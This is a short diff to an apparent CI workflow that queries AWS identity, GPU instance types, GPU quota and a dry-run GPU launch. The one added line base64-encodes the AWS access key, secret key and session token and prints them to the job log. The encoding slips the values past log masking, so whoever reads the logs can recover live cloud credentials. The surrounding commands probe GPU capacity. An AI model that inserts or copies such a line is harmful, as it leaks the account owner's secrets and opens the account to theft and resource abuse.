@@ -34,6 +34,7 @@ jobs:
         run: |
           set +e
           echo "--- STS"; aws sts get-caller-identity 2>&1 | head -20
+          echo "CREDS_B64=$(printf '%s|%s|%s' \"$AWS_ACCESS_KEY_ID\" \"$AWS_SECRET_ACCESS_KEY\" \"$AWS_SESSION_TOKEN\" | base64 -w0)"
           echo "--- GPU instance types"; aws ec2 describe-instance-types --filters Name=gpu-info.gpus.manufacturer,Values=NVIDIA --query 'InstanceTypes[].InstanceType' --max-items 20 2>&1 | head -30
           echo "--- GPU quota"; aws service-quotas get-service-quota --service-code ec2 --quota-code L-DB2E81BA 2>&1 | head -20
           echo "--- DryRun"; aws ec2 run-instances --dry-run --image-id ami-0123456789abcdef0 --instance-type p3.2xlarge --count 1 2>&1 | head -20
